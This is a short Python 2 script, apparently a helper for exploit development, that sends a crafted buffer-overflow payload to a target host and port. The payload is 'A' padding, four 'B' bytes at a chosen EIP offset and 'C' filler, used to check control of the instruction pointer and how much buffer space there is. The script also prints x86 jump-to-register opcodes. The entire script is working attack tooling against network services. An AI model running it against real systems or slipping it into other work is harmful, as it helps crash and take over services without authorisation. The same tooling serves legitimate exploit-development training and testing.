#!/usr/bin/python

import socket
import time
import sys

jump = {"eax":"\\xff\\xe0","ebx":"\\xff\\xe3","ecx":"\\xff\\xe1","edx":"\\xff\\xe2","ebp":"\\xff\\xe5","esp":"\\xff\\xe4","esi":"\\xff\\xe6","edi":"\\xff\\xe7"}

if len(sys.argv) == 2:
    register = sys.argv[1]
    register = register.lower()
    print jump[register]
    exit(0)

elif len(sys.argv) != 5:
    print("usage: \"python space.py [target] [port] [size] [eip]\"")
    print("usage: \"can also be used to find jump opcodes with \"python space.py [register name]\"")
    exit(0)

target = sys.argv[1]
port = int(sys.argv[2])
size = int(sys.argv[3])
eip = int(sys.argv[4])

herring = "This is before the EIP"
herring2 = "This is after the EIP"

inputBuffer = herring + "A" * (eip - len(herring)) + "B" * 4 + herring2 + "C" * (size - eip - len(herring2))
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((target,port))
print("sending buffer")
s.send(inputBuffer)
s.recv(1024)
s.close()
